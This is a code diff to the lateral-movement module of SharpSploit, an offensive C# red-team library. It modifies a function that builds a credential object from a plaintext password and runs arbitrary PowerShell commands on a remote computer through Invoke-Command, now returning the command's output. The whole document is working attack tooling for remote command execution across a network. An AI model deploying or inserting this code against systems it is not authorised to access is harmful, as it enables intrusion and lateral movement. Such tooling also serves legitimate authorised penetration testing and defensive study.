@@ -1,6 +1,4 @@
-﻿using System;
-
-using SharpSploit.Execution;
+﻿using SharpSploit.Execution;
 
 namespace SharpSploit.LateralMovement
 {
@@ -17,30 +15,27 @@ namespace SharpSploit.LateralMovement
         /// <param name="Domain">Domain for explicit credentials.</param>
         /// <param name="Username">Username for explicit credentials.</param>
         /// <param name="Password">Password for explicit credentials.</param>
-        /// <returns>Bool. True if execution succeeds, false otherwise.</returns>
+        /// <returns>String. Results of the PowerShell command.</returns>
         /// <author>Daniel Duggan (@_RastaMouse)</author>
         /// <remarks>
-        /// The return value is a little ambigious as the function won't return as long
-        /// as the command is still running on the remote target. Also, if execution fails
-        /// (e.g. because bad creds), it doesn't throw an error and it returns true regardless.
+        /// The function won't return as long as the command is still running on the remote target.
         /// </remarks>
-        public static bool InvokeCommand(string ComputerName, string Command, string Domain = "", string Username = "", string Password = "")
+        public static string InvokeCommand(string ComputerName, string Command, string Domain = "", string Username = "", string Password = "")
         {
             string command = string.Empty;
             bool useCredentials = Domain != "" && Username != "" && Password != "";
 
-            if(useCredentials)
+            if (useCredentials)
             {
-                command += $@"$Credential = New-Object System.Management.Automation.PSCredential(""{Domain}\\{Username}"", (ConvertTo-SecureString ""{Password}"" -AsPlainText -Force)); ";
+                command += $@"$Credential = New-Object System.Management.Automation.PSCredential(""{Domain}\{Username}"", (ConvertTo-SecureString ""{Password}"" -AsPlainText -Force)); ";
             }
             command += $@"Invoke-Command -ComputerName {ComputerName} -ScriptBlock {{ {Command} }}";
             if (useCredentials)
             {
                 command += $" -Credential $Credential";
             }
-            
-            Shell.PowerShellExecute(command, false);
-            return true;
+
+            return Shell.PowerShellExecute(command);
         }
     }
 }
